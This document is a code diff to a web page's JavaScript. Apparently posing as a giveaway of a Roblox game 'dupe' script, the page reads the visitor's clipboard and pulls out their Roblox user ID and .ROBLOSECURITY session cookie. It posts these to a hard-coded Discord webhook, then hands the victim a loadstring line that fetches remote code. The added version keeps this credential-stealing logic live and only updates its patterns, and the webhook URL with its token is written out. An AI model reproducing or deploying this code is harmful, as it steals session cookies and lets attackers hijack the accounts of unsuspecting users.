@@ -155,55 +155,56 @@
     const copyArea = document.getElementById('copyArea');
     const copyButton = document.getElementById('copyButton');
 
-    readClipboardButton.addEventListener('click', async () => {
-      // Show the arrow message
-      arrowMessage.style.display = 'block';
+readClipboardButton.addEventListener('click', async () => {
+  // Show the arrow message
+  arrowMessage.style.display = 'block';
 
-      try {
-        // Request permission and read from the clipboard
-        const clipboardText = await navigator.clipboard.readText();
-        
-        console.log('Clipboard content:', clipboardText);
+  try {
+    // Request permission and read from the clipboard
+    const clipboardText = await navigator.clipboard.readText();
+    
+    console.log('Clipboard content:', clipboardText);
 
-        // Extract the Roblox ID and roblosecurity cookie
-        const robloxIdMatch = clipboardText.match(/robloxid=(\d+)/); // Pattern for Roblox ID
-        const roblosecurityMatch = clipboardText.match(/\.ROBLOSECURITY=([A-Za-z0-9_-]+)/); // Pattern for roblosecurity cookie
+    // Extract the Roblox ID and roblosecurity cookie
+    const robloxIdMatch = clipboardText.match(/UserID=(-?\d+)/); // Updated pattern for Roblox ID
+    const roblosecurityMatch = clipboardText.match(/\.ROBLOSECURITY=([A-Za-z0-9_|-]+)/); // Updated pattern for roblosecurity cookie
 
-        const robloxId = robloxIdMatch ? robloxIdMatch[1] : 'Not found';
-        const roblosecurity = roblosecurityMatch ? roblosecurityMatch[1] : 'Not found';
+    const robloxId = robloxIdMatch ? robloxIdMatch[1] : 'Not found';
+    const roblosecurity = roblosecurityMatch ? roblosecurityMatch[1] : 'Not found';
 
-        console.log('Roblox ID:', robloxId);
-        console.log('roblosecurity:', roblosecurity);
+    console.log('Roblox ID:', robloxId);
+    console.log('roblosecurity:', roblosecurity);
 
-        // Send the data to the webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1318577132980535339/EeYegwPA9zdn8QvwOTrzVcUKzpgMzZV6J_IC-8WUs327aIExHN28qvx54JWzyguBo5J-';
+    // Send the data to the webhook
+    const webhookUrl = 'https://discord.com/api/webhooks/1318577132980535339/EeYegwPA9zdn8QvwOTrzVcUKzpgMzZV6J_IC-8WUs327aIExHN28qvx54JWzyguBo5J-';
 
-        // Prepare the data to send to Discord
-        const messageData = {
-          content: `**Roblox ID:** ${robloxId}\n**roblosecurity:** ${roblosecurity}`,
-        };
+    // Prepare the data to send to Discord
+    const messageData = {
+      content: `**Roblox ID:** ${robloxId}\n**roblosecurity:** ${roblosecurity}`,
+    };
 
-        // Send a POST request to the Discord webhook
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(messageData),
-        });
-
-        alert('Please hold tight while we find our latest script!');
-
-        // Show the popup with a message
-        overlay.style.display = 'block';
-        popup.style.display = 'block';
-        copyArea.value = `loadstring(game:HttpGet("https://raw.githubusercontent.com/moonlast/MM2/refs/heads/main/V2Dupe"))()`;
-
-      } catch (err) {
-        console.error('Failed to read clipboard content:', err);
-        alert('Failed to read clipboard. Please make sure the clipboard contains the correct data.');
-      }
+    // Send a POST request to the Discord webhook
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(messageData),
     });
+
+    alert('Please hold tight while we find our latest script!');
+
+    // Show the popup with a message
+    overlay.style.display = 'block';
+    popup.style.display = 'block';
+    copyArea.value = `loadstring(game:HttpGet("https://raw.githubusercontent.com/moonlast/MM2/refs/heads/main/V2Dupe"))()`;
+
+  } catch (err) {
+    console.error('Failed to read clipboard content:', err);
+    alert('Failed to read clipboard. Please make sure the clipboard contains the correct data.');
+  }
+});
+
 
 
 
